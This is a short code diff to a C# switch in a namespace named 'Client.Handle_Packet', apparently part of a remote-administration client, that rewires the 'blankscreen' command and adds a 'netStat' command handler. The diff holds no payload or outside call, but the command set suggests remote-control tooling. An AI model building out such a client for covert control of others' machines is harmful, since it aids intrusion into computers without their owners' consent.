@@ -300,13 +300,13 @@ namespace Client.Handle_Packet
                         
                     case "blankscreen":
                         {
-                            new HandleBlankScreen();
+                            HandleBlankScreen.RunBlankScreen();
                             break;
                         }
                         
-                    case "blankscreen":
+                    case "netStat":
                         {
-                            new HandleNetStat();
+                            HandleNetStat.RunNetStat();
                             break;
                         }
                 }
